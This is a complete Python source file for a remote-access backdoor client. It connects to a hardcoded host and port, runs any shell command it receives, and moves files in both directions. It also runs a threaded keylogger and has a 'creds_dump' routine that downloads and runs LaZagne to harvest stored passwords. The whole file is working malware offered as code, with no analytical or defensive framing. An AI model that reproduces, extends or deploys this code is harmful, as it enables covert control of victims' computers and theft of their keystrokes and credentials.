import base64
import json
import socket
import subprocess
import os
import requests
from pynput.keyboard import Key, Listener
import logging, threading
import tempfile

class Backdoor:

    def __init__(self, ip, port):
        # basic socket programming
        try:
            self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.conn.connect((ip, port))
            self.stop_event = threading.Event()  # Initialize stop_event here
        except Exception as e:
            print(f"[-] Socket connection failed: {e}")

    # to receive data from server
    def receive(self):
        json_result = ''
        while True:
            try:
                json_result += self.conn.recv(1024).decode()
                result = json.loads(json_result)
                return result
            except Exception as e:
                continue

    # to send data to the server
    # as the subprocess check output returns bytes we need to provide string to dumps method
    # but again we have to encode to again turn it into byte string to pass it through network

    def send(self, data):
        try:
            data = base64.b64encode(data)  # it takes data as bytes and also return bytes
            json_data = json.dumps(data.decode())
            self.conn.send(json_data.encode())
        except Exception as e:
            print(f"[-] Error sending data: {e}".encode())

    # to execute remote commands in the stable shell
    def execute_remote_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except Exception:
            return b"[-]failed to execute command ."

    # to change directory and remain in same process everytime
    def change_working_directory(self, command):
        try:
            os.chdir(command.split(' ')[1])
            return b"[+] Directory changed."
        except Exception:
            return b"[-] Failed to change directory"

    # Method to download
    def download_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except Exception:
            return b"[-] File not found"

    # Method to  define keyscan
    def keyscan_start(self):
        # INFO,DEBUG,WARNING,CRITICAL
        logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s %(message)s")

        #listener callback
        def on_press(key):
            if not self.stop_event.is_set():
                logging.info(str(key))
            else:
                return False  # This will stop the listener

        # keyboard listener
        with Listener(on_press=on_press) as listener:
            listener.join()

    # Method to dump the keyscan
    def keyscan_dump(self):
        result = self.download_file("keylog.txt")
        return result

    # Method to  release the thread
    def keyscan_stop(self):
        self.stop_event.set()  # Set the event to stop the keylogging thread
        return b"[+] Keyscan stopped."

    # Method to upload
    def upload_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(base64.b64decode(content))
                return b"[+] File uploaded."
        except Exception:
            return b"[-] File write error"

    # Method to dump credentials
    def creds_dump(self):
        url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
        content = requests.get(url).content
        pwd = os.getcwd()
        os.chdir(tempfile.gettempdir())
        with open('LaZagne.exe', 'wb') as file:
            file.write(content)

        result = subprocess.check_output("LaZagne.exe all")
        os.remove("LaZagne.exe")
        os.chdir(pwd)
        return result

    # to obtain the commands to pass to execute
    def run(self):
        while True:
            try:
                data = self.receive()
                if data.startswith('cd'):
                    result = self.change_working_directory(data)
                elif data.startswith('download'):
                    result = self.download_file(data.split(' ')[1])
                elif data.startswith('keyscan_start'):
                    result = b"[+] Keyscan started"
                    self.stop_event.clear()  # Clear the stop event before starting keylogging
                    t = threading.Thread(target=self.keyscan_start, daemon=True)
                    t.start()
                elif data.startswith('keyscan_dump'):
                    result = self.keyscan_dump()
                elif data.startswith('keyscan_stop'):
                    result = self.keyscan_stop()
                elif data.startswith('upload'):
                    result = self.upload_file(data.split(' ')[1], data.split(' ')[2])
                elif data.startswith('creds_dump'):
                    result = self.creds_dump()
                elif data.startswith('exit'):
                    result = self.conn.close()
                    exit(0)
                else:
                    result = self.execute_remote_command(data)
                self.send(result)
            except KeyboardInterrupt:
                exit(0)


# to create object of class and run

backdoor = Backdoor('192.168.100.32', 4444)
backdoor.run()
